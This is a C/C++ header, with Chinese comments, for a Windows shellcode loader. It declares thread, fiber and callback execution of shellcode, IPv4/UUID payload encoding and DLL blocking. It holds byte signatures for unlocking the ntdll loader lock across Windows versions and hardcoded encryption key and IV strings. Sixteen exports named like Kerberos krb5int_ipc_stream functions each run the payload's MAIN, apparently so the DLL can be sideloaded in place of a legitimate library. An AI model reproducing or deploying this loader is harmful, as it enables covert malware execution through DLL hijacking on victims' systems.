#pragma once
#include <Windows.h>

BOOL Local_blockdlls();

#ifdef EXECUTE_THREAD
BOOL Execute(PVOID addr, DWORD64 sizeofaddr);
#endif // EXECUTE_THREAD

#ifdef EXECUTE_FIBER
BOOL ExecuteFiber(PVOID addr, DWORD64 sizeofaddr);
#endif

#ifdef EXECUTE_CALLBACK
BOOL ExecuteCallback(PVOID addr, DWORD64 sizeofaddr);
#endif

#ifdef ENCODE_IPV4
BOOL InitIpv4Api();
#endif

#ifdef ENCODE_UUID
BOOL InitUuidApi();
BOOL LoadRpcrt4();
#endif

#ifdef _WIN64
//LdrFastFailInLoaderCallout导出函数开始匹配的特征码
unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00 };
//针对没有LdrFastFailInLoaderCallout导出函数的，全局特征码
unsigned char win7_lock_count_flag[] = { 0xF0, 0x44, 0x0F, 0xB1, 0x35, 0xFF, 0xFF, 0xFF, 0xFF, 0x41 };
#else
unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8 };
unsigned char win7_lock_count_flag[] = { 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8 };
#endif

#ifdef _WIN64
//LdrGetDllFullName导出函数开始匹配的特征码，有两个是为了兼容不同版本系统
unsigned char win10_staic_lock_flag1[] = { 0x48, 0x8B, 0x05, 0xFF, 0xFF, 0xFF, 0x00 };
unsigned char win10_staic_lock_flag2[] = { 0x48, 0x8B, 0x1d, 0xFF, 0xFF, 0xFF, 0x00 };
#else
unsigned char win10_staic_lock_flag1[] = { 0x3b, 0x3d };
#endif

#ifdef _WIN32
//上面的修改对server2012下32位程序还无法突破，需要额外解锁
unsigned char server12_staic_lock_flag[] = { 0x64, 0x8B, 0x1D, 0x18, 0x00, 0x00, 0x00, 0x83, 0x65, 0xDC, 0x00, 0xBA };
#endif

VOID UNLOOK();
BYTE* readSectionData(BYTE* buffer, PDWORD rdataLength, char* secName);
size_t memFind(BYTE* mem, BYTE* search, size_t memSize, size_t length);
size_t GetSkipFileAPIBrokering(VOID);
void runShellcode();
bool MAIN();
DWORD WINAPI MainProxy(LPVOID lpParam);

 const CHAR* keys = "oOtZUbmSnxpeasFHK4PQf3OFC1W4h8F8";
 const CHAR* iv = "bbenIxFM194pKbip";
extern "C" __declspec(dllexport) int krb5int_ipc_stream_write_int32() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_read_uint32() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_read_int64() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_write_int64() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_asprintf() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_read_int32() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_write_string() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_read_string() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_write_uint32() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_data() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_write() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_free_string() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_size() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_new() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_release() { return MAIN(); }
extern "C" __declspec(dllexport) int krb5int_ipc_stream_read() { return MAIN(); }